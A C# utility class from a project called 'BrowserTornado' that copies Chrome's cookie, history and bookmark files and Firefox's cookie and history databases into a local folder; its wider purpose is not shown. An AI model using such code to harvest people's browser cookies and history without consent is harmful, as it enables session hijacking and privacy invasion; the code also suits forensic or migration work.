using System;
using System.IO;

namespace BrowserTornado
{
    public static class CopyUtility
    {
        /// <summary>
        /// Copy all chrome's databases into the local "TempFiles" folder
        /// </summary>
        /// <returns>Bool stating the result of the operation</returns>
        public static bool CopyChromeDatabases()
        {
            var basePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"..\Local\Google\Chrome\User Data\Default");

            if (Directory.Exists(basePath))
            {
                return (CopyDatabase(Path.Combine(basePath, "Cookies"), "chrome-cookies") &&
                    CopyDatabase(Path.Combine(basePath, "History"), "chrome-history") &&
                    CopyDatabase(Path.Combine(basePath, "Bookmarks"), "chrome-bookmarks"));
            }

            return false;
        }


        /// <summary>
        /// Copy all firefox's databases into the local "TempFiles" folder
        /// </summary>
        /// <returns>Bool stating the result of the operation</returns>
        public static bool CopyFirefoxDatabases()
        {
            var basePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Mozilla\Firefox\Profiles");

            if (Directory.Exists(basePath))
            {
                var dir = Directory.GetDirectories(basePath)[0];

                return (CopyDatabase(Path.Combine(basePath, dir, "cookies.sqlite"), "ff-cookies") &&
                    CopyDatabase(Path.Combine(basePath, dir, "places.sqlite"), "ff-places"));
            }

            return false;
        }


        /// <summary>
        /// Called by CopyChromeDatabase and CopyFirefoxDatabase,
        /// copy the given file to the 'TempFiles' folder inside the current directory.
        /// If the file already exists, overwrite it
        /// </summary>
        /// <param name="path">Path of the file to copy</param>
        /// <param name="newFileName">Name of the file to write</param>
        /// <returns>Result of the operation</returns>
        static bool CopyDatabase(string path, string newFileName)
        {
            try
            {
                File.Copy(path, @"TempFiles\" + newFileName, true);
                return true;
            }
            catch (IOException)
            {
                return false;
            }
        }
    }
}
